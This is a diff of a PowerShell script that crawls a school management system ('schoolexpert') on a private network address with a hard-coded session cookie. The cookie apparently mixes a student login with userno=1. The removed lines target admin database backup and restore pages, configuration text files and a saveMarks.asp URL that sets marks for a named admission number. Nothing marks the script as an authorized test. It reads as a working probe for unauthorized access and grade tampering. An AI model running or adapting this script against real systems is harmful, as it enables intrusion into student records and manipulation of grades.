@@ -1,127 +1,103 @@
 # --- Configuration ---
 $BaseUrl    = "http://192.168.29.20"
-$UserAgent  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-$Cookie     = "fy=2025; userno=1;"
+$UserAgent  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+$Cookie     = "admNoE=%C7%0D%90%E6%E8; fyE=%C4%0A%97%E2; loginByE=%A5N%D0%B3%B8%23%08; admNo=17515; fy=2025; loginBy=Student; userno=1; lock=none; _gid=GA1.2.1932742890.1772021591; userno=1; fy=2025; usernoT=jXycB19tcRyJD3LguLToZbBvdfyJ%2BLiKzIIlSoz0PFLqgddd2Ufoad7x6VPZAB3OXObTIowXsQDWkBsnHGYKZw%3D%3D; fyT=B0%2FrbDxWkgqbNNx35RCvqVFiWwnid5j6BIx8jPC%2FgGylGzOut0gbS2dOm1Jt5uyuH5Gx5uVbs8khxUzY8HYmqw%3D%3D;"
 $Timeout    = 120 
-$OutputFile = Join-Path $env:TEMP "Internal_Crawl_$(Get-Date -Format 'yyyyMMdd_HHmm').json"
+$OutputFile = Join-Path $env:TEMP "Protocol_Analysis_$(Get-Date -Format 'yyyyMMdd_HHmm').json"
 
-# --- Core Targets ---
-$CorePaths = @(
-    "/",
-    "/schoolexpert",
-    "/schoolexpert/modules",
-    "/schoolexpert/dashboard",
-    "/schoolexpert/dashboardv2"
+$Paths = @(
+
+    "/schoolexpert/top.asp",
+    "/schoolexpert/main.asp",
+    "/schoolexpert/main.php",
+    "/schoolexpert/newmain.asp",
+    "/schoolexpert/logout.asp",
+    "/schoolexpert/top.txt"
+
 )
 
-# --- Auto expand .asp / .php ---
-$ExpandedCore = @()
-foreach ($path in $CorePaths) {
-    $ExpandedCore += "$path.asp"
-    $ExpandedCore += "$path.php"
+$RequestHeaders = @{
+    "User-Agent"      = $UserAgent
+    "Cookie"          = $Cookie
+    "Referer"         = "$BaseUrl/schoolexpert"
+    "Accept"          = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+    "Accept-Language" = "en-US,en;q=0.5"
 }
 
-# --- Admin Endpoints ---
-$AdminPaths = @(
-    "/schoolexpert/mstrUsers.asp",
-    "/schoolexpert/adminDatabaseBackup.asp",
-    "/schoolexpert/adminDatabaseRestore.asp",
-    "/schoolexpert/adminSchoolSetup.asp",
-    "/schoolexpert/adminChangePswd.asp",
-    "/schoolexpert/administrator.asp"
-)
+$AllTransactionLogs = @()
 
-# --- SMS Endpoints ---
-$SmsPaths = @(
-    "/schoolexpert/smsStudents.asp",
-    "/schoolexpert/smsEmployeesNew.asp",
-    "/schoolexpert/smsTemplates.asp",
-    "/schoolexpert/smsAPI.asp",
-    "/schoolexpert/notificationStudents.asp"
-)
-
-# --- Examination Endpoints ---
-$ExamPaths = @(
-    "/schoolexpert/examMarksEntry.asp",
-    "/schoolexpert/examMarksEntry2.asp",
-    "/schoolexpert/examMarksEntry3.asp",
-    "/schoolexpert/examMarksEntry4.asp",
-    "/schoolexpert/studentWiseMarksEntry.asp",
-    "/schoolexpert/coScholasticGradesEntry.asp"
-)
-
-# --- Custom / Sensitive ---
-$CustomPaths = @(
-    "/schoolexpert/saveMarks.asp",
-    "/schoolexpert/saveMarks.asp?marksObt=19&adm_no=18887&maxMarks=25&fy=2025&userNo=1",
-    "/schoolexpert/connection.txt",
-    "/schoolexpert/loginCheck.txt",
-    "/schoolexpert/StudentloginCheck.txt",
-    "/schoolexpert/schoolDetails.txt",
-    "/schoolexpert/onlineconnection.txt",
-    "/schoolexpert/SELibrary.txt"
-)
-
-# --- Merge All ---
-$Paths = $ExpandedCore + $AdminPaths + $SmsPaths + $ExamPaths + $CustomPaths
-
-# --- Headers ---
-$Headers = @{
-    "User-Agent" = $UserAgent
-    "Cookie"     = $Cookie
-    "Referer"    = "$BaseUrl/schoolexpert"
-}
-
-$AllResults = @()
-
-Write-Host "Starting Data Extraction..." -ForegroundColor Cyan
-Write-Host "Target: $BaseUrl"
-Write-Host "Total Paths: $($Paths.Count)"
+Write-Host "--- ADVANCED PROTOCOL EXTRACTION STARTING ---" -ForegroundColor Cyan
 
 foreach ($Path in $Paths) {
     $FullUrl = "$BaseUrl$Path"
-
-    $Entry = [ordered]@{
-        url           = $FullUrl
-        timestamp     = (Get-Date).ToString("o")
-        status_code   = 0
-        content_found = $false
-        base64_body   = ""
-        error         = ""
+    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
+    
+    $LogEntry = [ordered]@{
+        metadata = @{
+            url          = $FullUrl
+            timestamp    = (Get-Date).ToString("o")
+            method       = "GET"
+        }
+        request = @{
+            headers      = $RequestHeaders
+        }
+        response = @{
+            status_code  = 0
+            status_desc  = ""
+            latency_ms   = 0
+            headers      = @{}
+            set_cookie   = @()
+            body_base64  = ""
+            size_bytes   = 0
+        }
+        error = $null
     }
 
     try {
-        $Response = Invoke-WebRequest `
-            -Uri $FullUrl `
-            -Headers $Headers `
-            -Method Get `
-            -TimeoutSec $Timeout `
-            -ErrorAction Stop
+        # Execute Request
+        $Resp = Invoke-WebRequest -Uri $FullUrl -Headers $RequestHeaders -Method Get -UseBasicParsing -TimeoutSec $Timeout -ErrorAction Stop
+        $Stopwatch.Stop()
 
-        $Entry.status_code   = [int]$Response.StatusCode
-        $Entry.content_found = $true
-
-        $RawBytes = $Response.Content
-        if ($RawBytes -is [string]) {
-            $RawBytes = [System.Text.Encoding]::UTF8.GetBytes($RawBytes)
+        # Capture Response Details
+        $LogEntry.response.status_code = [int]$Resp.StatusCode
+        $LogEntry.response.status_desc = $Resp.StatusDescription
+        $LogEntry.response.latency_ms  = $Stopwatch.ElapsedMilliseconds
+        
+        # Capture ALL Response Headers
+        foreach ($h in $Resp.Headers.GetEnumerator()) {
+            $LogEntry.response.headers.Add($h.Key, $h.Value)
+            # Specifically track cookie changes
+            if ($h.Key -eq "Set-Cookie") { $LogEntry.response.set_cookie += $h.Value }
         }
 
-        $Entry.base64_body = [Convert]::ToBase64String($RawBytes)
+        # Encode Body
+        $ContentBytes = $Resp.Content
+        if ($ContentBytes -is [string]) { $ContentBytes = [System.Text.Encoding]::UTF8.GetBytes($ContentBytes) }
+        $LogEntry.response.body_base64 = [Convert]::ToBase64String($ContentBytes)
+        $LogEntry.response.size_bytes  = $ContentBytes.Length
 
-        Write-Host "[+] $Path" -ForegroundColor Green
+        Write-Host "[$($LogEntry.response.status_code)] $($LogEntry.response.latency_ms)ms - $Path" -ForegroundColor Green
+
     } catch {
-        $Entry.error = $_.Exception.Message
+        $Stopwatch.Stop()
+        $LogEntry.error = $_.Exception.Message
         if ($_.Exception.Response) {
-            $Entry.status_code = [int]$_.Exception.Response.StatusCode
+            $LogEntry.response.status_code = [int]$_.Exception.Response.StatusCode
         }
-
-        Write-Host "[-] $Path" -ForegroundColor Red
+        Write-Host "[ERR] $Path - $($LogEntry.error)" -ForegroundColor Red
     }
 
-    $AllResults += $Entry
+    $AllTransactionLogs += $LogEntry
 }
 
-# --- Save ---
-$AllResults | ConvertTo-Json -Depth 10 | Set-Content -Path $OutputFile -Encoding UTF8
-
-Write-Host "`nDone. Saved to: $OutputFile" -ForegroundColor Yellow
+# Final Save
+try {
+    $FinalJson = $AllTransactionLogs | ConvertTo-Json -Depth 20
+    $FinalJson | Set-Content -Path $OutputFile -Encoding UTF8
+    
+    Write-Host "`nAnalysis Finished Successfully." -ForegroundColor Cyan
+    Write-Host "Full Protocol Log: " -NoNewline
+    Write-Host $OutputFile -ForegroundColor Yellow
+} catch {
+    Write-Host "Critical Save Failure: $($_.Exception.Message)" -ForegroundColor Red
+}
